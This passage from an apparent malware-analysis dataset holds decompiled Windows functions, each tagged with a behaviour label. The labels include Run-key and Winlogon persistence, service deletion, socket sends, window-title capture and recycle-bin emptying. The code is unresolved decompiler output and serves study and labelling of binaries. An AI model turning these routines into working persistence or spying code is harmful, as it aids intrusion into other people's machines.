        "decompiled_code": "\nvoid fcn.0048dff0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffd0;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x48e05d;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405530();\n    iVar1 = sub.user32.dll_GetForegroundWindow();\n    if (iVar1 != 0) {\n        iVar2 = sub.user32.dll_GetWindowTextLengthA(iVar1);\n        fcn.00405c6c();\n        uVar3 = fcn.004059dc(iVar2 + 1);\n        sub.user32.dll_GetWindowTextA(iVar1, uVar3);\n        fcn.00409c20();\n        in_stack_ffffffd0 = iVar1;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    fcn.00405530(0x48e064);\n    return;\n}\n",
        "token_count": 269
    },
    "004715b0": {
        "rules": [
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\nvoid fcn.004715b0(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStackY68;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x4715c2;\n    fcn.004059cc();\n    uStack28 = 0x47162f;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    iVar1 = sub.advapi32.dll_OpenSCManagerA(0, 0, 0xf003f);\n    if (iVar1 != 0) {\n        uVar2 = fcn.004059dc(0x10000);\n        iVar3 = sub.advapi32.dll_OpenServiceA(iVar1, uVar2);\n        if (iVar3 != 0) {\n            sub.advapi32.dll_DeleteService(iVar3);\n            sub.advapi32.dll_CloseServiceHandle(iVar3);\n        }\n        sub.advapi32.dll_CloseServiceHandle();\n        iStackY68 = iVar1;\n    }\n    *in_FS_OFFSET = iStackY68;\n    fcn.00405530(0x471636);\n    return;\n}\n",
        "token_count": 304
    },
    "0048d6d4": {
        "rules": [
            "get common file path"
        ],
        "decompiled_code": "\nvoid fcn.0048d6d4(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00402f00();\n    sub.kernel32.dll_GetSystemDirectoryA(uVar1, 0x90);\n    fcn.0040aaa8();\n    fcn.00402f1c();\n    return;\n}\n",
        "token_count": 75
    },
    "0048d704": {
        "rules": [
            "get common file path"
        ],
        "decompiled_code": "\nvoid fcn.0048d704(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00402f00();\n    sub.kernel32.dll_GetWindowsDirectoryA(uVar1, 0x90);\n    fcn.0040aaa8();\n    fcn.00402f1c();\n    return;\n}\n",
        "token_count": 73
    },
    "00470c90": {
        "rules": [
            "persist via Run registry key"
        ],
        "decompiled_code": "\nvoid fcn.00470c90(void)\n\n{\n    fcn.004216c4();\n    fcn.004217a0();\n    fcn.004218e4();\n    fcn.00422068();\n    return;\n}\n",
        "token_count": 51
    },
    "0047f4c0": {
        "rules": [
            "send data on socket",
            "send data"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047f4c0(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00405a3c(1, 0);\n    sub.wsock32.dll_send(*(arg_8h + -4), uVar1);\n    return;\n}\n",
        "token_count": 72
    },
    "00480860": {
        "rules": [
            "send data on socket",
            "send data"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00480860(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00405a3c(1, 0);\n    sub.wsock32.dll_send(*(arg_8h + -4), uVar1);\n    return;\n}\n",
        "token_count": 69
    },
    "004853d8": {
        "rules": [
            "persist via Winlogon Helper DLL registry key"
        ],
        "decompiled_code": "\nvoid fcn.004853d8(void)\n\n{\n    uint32_t arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack32 = 0x48549b;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack36;\n    fcn.00421708();\n    fcn.004217a0();\n    fcn.004218e4();\n    fcn.00422068();\n    arg_ch = *0x4854fc;\n    arg_8h = &var_8h;\n    fcn.0040f234();\n    fcn.00405864();\n    fcn.0040ef44(arg_8h, arg_ch);\n    fcn.004055c8();\n    fcn.00422008();\n    fcn.00404650();\n    *in_FS_OFFSET = arg_8h;\n    iStack36 = 0x4854a2;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 297
    },
    "0048a46c": {
        "rules": [
            "empty the recycle bin"
        ],
        "decompiled_code": "\nvoid fcn.0048a46c(void)\n\n{\n    sub.SHELL32.DLL_SHEmptyRecycleBinA(0, 0x48a47c, 1);\n    return;\n}\n",
        "token_count": 46
    }
}